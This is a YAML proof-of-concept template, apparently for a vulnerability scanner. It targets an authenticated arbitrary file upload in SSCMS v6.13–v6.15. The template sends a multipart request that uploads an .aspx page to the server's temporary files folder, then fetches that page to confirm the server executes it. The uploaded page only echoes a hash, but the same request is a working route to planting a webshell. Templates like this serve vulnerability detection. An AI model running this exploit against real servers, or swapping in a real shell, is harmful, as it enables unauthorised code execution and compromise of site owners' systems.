name: poc-yaml-sscms-arbitrary-fileupload-getshell
binding: 09a7d40e-3f5a-48e2-b315-58833a32b423
manual: true
detail:
    author: secking
    links:
        - https://github.com/siteserver/cms
    vulnerability:
        id: CT-529821
        level: high
    description: sscms v6.13-v6.15 任意文件上传可getshell
    info: 需管理员登录
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    num: randomLowercase(16)
    echo: md5(num)
    rboundary: randomInt(40000000000000, 50000000000000)
rules:
    r0:
        request:
            cache: false
            method: POST
            path: /api/pages/cms/specialAddLayer/actions/upload?siteId=100&guid={{num}}
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
            body: "-----------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"fileName\"\r\n\r\n{{num}}.aspx\r\n-----------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"num.zip\"\r\nContent-Type: application/zip\r\n\r\n<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(\"{{echo}}\");%>\r\n-----------------------------{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && response.body.ibcontains(bytes(num)) && response.body.bcontains(bytes("fileName"))
    r1:
        request:
            cache: false
            method: GET
            path: /SiteFiles/TemporaryFiles/{{num}}/{{num}}.aspx
        expression: response.status == 200 && response.body.ibcontains(bytes(echo))
expression: r0() && r1()
